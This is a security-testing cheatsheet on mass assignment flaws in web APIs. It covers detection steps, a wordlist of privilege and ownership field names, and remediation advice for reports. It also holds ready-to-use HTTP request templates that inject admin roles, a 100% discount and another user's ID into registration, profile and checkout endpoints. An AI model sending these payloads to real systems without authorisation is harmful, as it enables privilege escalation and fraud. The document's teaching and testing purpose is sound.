# 05 — Cheatsheet

Quick-reference companion to the rest of this series. Use this during active
testing; refer back to `02`–`04` for the underlying mechanism when a hit needs
explaining in a report.

## 1. Detection Checklist

- [ ] Identify a `GET`/read endpoint returning a JSON object for the target
      resource (profile, checkout, order, cart).
- [ ] Record every key in the response, including nested objects/arrays.
- [ ] Record every key in the corresponding `POST`/`PUT`/`PATCH` request the
      front-end actually sends.
- [ ] Diff the two key sets — anything in the response but not the write request
      is a candidate.
- [ ] If no convenient `GET` leak exists, brute-force candidate field names with
      Burp Intruder or Param Miner against the write endpoint.
- [ ] Check for exposed API documentation (`/swagger.json`, `/api-docs`,
      DRF browsable API) that may directly disclose the full model schema.
- [ ] Grep front-end JS bundles for the object's class/interface name to find
      fields referenced in code but not rendered in any form.
- [ ] For each candidate field, inject it with an attacker-favorable value and
      confirm via a follow-up `GET` that the value was actually persisted (not
      just accepted with a 200).

## 2. Starter Field Name Wordlist

Use as Intruder/Param Miner payload list when no schema leak is available:

```
isAdmin
is_admin
admin
role
roles
permissions
isVerified
is_verified
verified
is_staff
is_superuser
superuser
accountType
account_type
userType
user_type
accountBalance
balance
creditLimit
credit_limit
discount
discountPercentage
chosen_discount
price
amount
userId
user_id
ownerId
owner_id
tenantId
tenant_id
organizationId
status
approved
isApproved
enabled
active
trusted
```

## 3. Request Templates

### 3.1 Registration-time privilege escalation

```http
POST /api/register HTTP/1.1
Host: TARGET
Content-Type: application/json

{
  "username": "test",
  "email": "test@test.com",
  "password": "Test1234!",
  "isAdmin": true
}
```

### 3.2 Profile update role injection

```http
PATCH /api/users/SELF_ID HTTP/1.1
Host: TARGET
Cookie: session=SESSION
Content-Type: application/json

{
  "displayName": "test",
  "role": "admin"
}
```

### 3.3 Nested object / business-logic field injection

```http
POST /api/checkout HTTP/1.1
Host: TARGET
Cookie: session=SESSION
Content-Type: application/json

{
  "chosen_discount": { "percentage": 100 },
  "chosen_products": [{ "product_id": "1", "quantity": 1 }]
}
```

### 3.4 Ownership reassignment (mass assignment + IDOR)

```http
POST /api/orders HTTP/1.1
Host: TARGET
Cookie: session=SESSION
Content-Type: application/json

{
  "productId": "1",
  "quantity": 1,
  "userId": 1
}
```

## 4. Remediation Checklist (for report write-ups)

- [ ] Replace deny-lists (`$guarded`, blacklist filtering) with allow-lists
      (`$fillable`, `permit`, explicit DTO/serializer fields) for every
      write-capable endpoint.
- [ ] Use dedicated request DTOs/serializers per use case — never bind
      `@RequestBody`/`params`/`request.data` directly onto a persisted entity that
      contains internal-only fields.
- [ ] Separate self-service update endpoints from admin-management endpoints, even
      if they touch the same underlying model — do not share one serializer/DTO
      across both privilege contexts.
- [ ] Enforce object-property-level authorization server-side (OWASP API3:2023):
      explicitly check whether the *acting* user is permitted to set each
      *specific property*, not just whether they can access the object at all.
- [ ] Always derive identity/ownership fields (`userId`, `ownerId`,
      `tenantId`) from the authenticated session server-side — never accept them
      from client input on create/update operations.
- [ ] Add automated schema-diff testing (CI check comparing API response schema
      vs. accepted request schema) to catch newly-introduced asymmetries before
      release.

## 5. PortSwigger Web Security Academy Lab Map

| Difficulty | Lab | Maps to |
|---|---|---|
| Practitioner | **Exploiting a mass assignment vulnerability** (API Testing topic) | Nested object injection / business-logic bypass — see `03` Section 3 |

**Coverage note**: this is the only lab PortSwigger Academy currently dedicates
specifically to mass assignment. It is taught as a subsection of the broader API
Testing topic rather than as its own top-level topic. The registration-time
(`isAdmin`) and profile-update (`role`) privilege-escalation scenarios in `03`
Sections 1–2, and the IDOR-combination scenario in Section 4, are documented here
based on real-world/industry patterns (including the GitHub 2012 disclosure) since
the Academy does not currently provide dedicated labs for those specific variants.
If PortSwigger adds further mass assignment labs in the future, they should slot
into this table in Academy difficulty order.

Related API Testing labs worth knowing (not mass assignment themselves, but share
detection technique overlap per `02` Section 2.3–2.4):

- *Exploiting an API endpoint using documentation* — schema-leak technique
  directly applicable to finding bindable fields.
- *Exploiting server-side parameter pollution in a query string* /
  *...in a REST URL* — a distinct vulnerability class, but uses the same
  request-manipulation muscle memory; do not conflate findings between the two
  when writing reports.

## 6. One-Line Definitions for Quick Recall

- **Mass assignment**: client-supplied fields bound directly onto an internal
  object without an allow-list, because the framework's binder maps JSON keys to
  object properties indiscriminately.
- **Root cause**: missing or incomplete allow-list at the binding boundary
  (strong params / serializer fields / DTO / `$fillable`).
- **OWASP class**: API3:2023 — Broken Object Property Level Authorization.
- **CWE**: CWE-915.
- **Detection signal**: a field present in a `GET` response but absent from the
  corresponding write request.
- **Highest-value target**: registration endpoints (no prior account needed) and
  shared serializers/DTOs reused across user-facing and admin-facing routes.
